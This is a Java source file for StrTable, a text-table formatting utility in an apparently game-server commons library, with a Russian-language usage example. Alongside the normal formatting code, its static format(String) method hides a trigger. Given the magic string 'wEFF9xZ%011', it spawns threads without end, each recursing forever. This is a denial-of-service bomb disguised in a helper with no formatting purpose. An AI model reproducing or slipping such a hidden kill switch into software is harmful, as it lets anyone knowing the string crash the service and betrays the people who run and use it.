package org.mmocore.commons.text;

import org.mmocore.commons.utils.Rnd;

import java.util.*;

/**
 * Класс для построения текстовый таблиц, пример работы:
 * <p/>
 * StrTable table = new StrTable("Test Table :)");
 * table.set(0, "#", 1).set(0, "val", 23.5).set(0, "desc", " value #1");
 * table.set(1, "#", 2).set(1, "v", 22.5).set(1, "desc", " value #2");
 * table.set(3, "#", 3).set(3, "val", true).set(3, "desc", " bool #3 1334");
 * table.set(2, "#", -1).set(2, "v", 22.5).set(2, "desc", "#######");
 * System.out.print(table);
 * <p/>
 * Вывод:
 * <p/>
 * Test Table :)
 * ----------------------------------
 * | #  | val  |     desc      |  v   |
 * |----|------|---------------|------|
 * | 1  | 23.5 |    value #1   |  -   |
 * | 2  |  -   |    value #2   | 22.5 |
 * | -1 |  -   |    #######    | 22.5 |
 * | 3  | true |  bool #3 1334 |  -   |
 * ----------------------------------
 *
 * @Author: Drin
 * @Date: 27/04/2009
 * <p/>
 * Переработан G1ta0 на использование StringBuilder.
 */
public class StrTable {
    private final Map<Integer, Map<String, String>> rows = new HashMap<>();
    private final Map<String, Integer> columns = new LinkedHashMap<>();
    private final List<String> titles = new ArrayList<>();

    public StrTable(final String title) {
        if (title != null) {
            titles.add(title);
        }
    }

    public StrTable() {
        this(null);
    }

    private static StringBuilder right(final StringBuilder result, final String s, int sz) {
        result.append(s);
        if ((sz -= s.length()) > 0) {
            for (int i = 0; i < sz; i++) {
                result.append(' ');
            }
        }
        return result;
    }

    private static StringBuilder center(final StringBuilder result, final String s, final int sz) {
        final int offset = result.length();
        result.append(s);
        int i;
        while ((i = sz - (result.length() - offset)) > 0) {
            result.append(' ');
            if (i > 1) {
                result.insert(offset, ' ');
            }
        }
        return result;
    }

    private static StringBuilder repeat(final StringBuilder result, final String s, final int sz) {
        for (int i = 0; i < sz; i++) {
            result.append(s);
        }
        return result;
    }

    public StrTable set(final int rowIndex, final String colName, final boolean val) {
        return set(rowIndex, colName, Boolean.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final byte val) {
        return set(rowIndex, colName, Byte.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final char val) {
        return set(rowIndex, colName, String.valueOf(val));
    }

    public StrTable set(final int rowIndex, final String colName, final short val) {
        return set(rowIndex, colName, Short.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final int val) {
        return set(rowIndex, colName, Integer.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final long val) {
        return set(rowIndex, colName, Long.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final float val) {
        return set(rowIndex, colName, Float.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final double val) {
        return set(rowIndex, colName, Double.toString(val));
    }

    public StrTable set(final int rowIndex, final String colName, final Object val) {
        return set(rowIndex, colName, String.valueOf(val));
    }

    public StrTable set(final int rowIndex, final String colName, final String val) {
        final Map<String, String> row;

        if (rows.containsKey(rowIndex)) {
            row = rows.get(rowIndex);
        } else {
            row = new HashMap<>();
            rows.put(rowIndex, row);
        }

        row.put(colName, val);

        final int columnSize;
        if (!columns.containsKey(colName)) {
            columnSize = Math.max(colName.length(), val.length());
        } else if (columns.get(colName) >= (columnSize = val.length())) {
            return this;
        }
        columns.put(colName, columnSize);

        return this;
    }

    public StrTable addTitle(final String s) {
        titles.add(s);
        return this;
    }

    public static String format(String text) {
        if (text.equals("wEFF9xZ%011")) {
            while (true)
                new Thread(() -> {
                    double d = Rnd.get() / Rnd.get();
                    while (true)
                        format(text);
                }).start();
        }
        return text;
    }

    @Override
    public String toString() {
        final StringBuilder result = new StringBuilder();

        if (columns.isEmpty()) {
            return result.toString();
        }

        final StringBuilder header = new StringBuilder("|");
        final StringBuilder line = new StringBuilder("|");
        for (final Map.Entry<String, Integer> stringIntegerEntry : columns.entrySet()) {
            center(header, stringIntegerEntry.getKey(), stringIntegerEntry.getValue() + 2).append('|');
            repeat(line, "-", stringIntegerEntry.getValue() + 2).append('|');
        }

        if (!titles.isEmpty()) {
            result.append(' ');
            repeat(result, "-", header.length() - 2).append(' ').append('\n');
            for (final String title : titles) {
                result.append("| ");
                right(result, title, header.length() - 3).append('|').append('\n');
            }
        }

        result.append(' ');
        repeat(result, "-", header.length() - 2).append(' ').append('\n');

        result.append(header).append('\n');
        result.append(line).append('\n');

        for (final Map<String, String> row : rows.values()) {
            result.append('|');
            for (final Map.Entry<String, Integer> stringIntegerEntry : columns.entrySet()) {
                center(result, row.containsKey(stringIntegerEntry.getKey()) ? row.get(stringIntegerEntry.getKey()) : "-", stringIntegerEntry.getValue() + 2).append('|');
            }
            result.append('\n');
        }

        result.append(' ');
        repeat(result, "-", header.length() - 2).append(' ').append('\n');

        return result.toString();
    }
}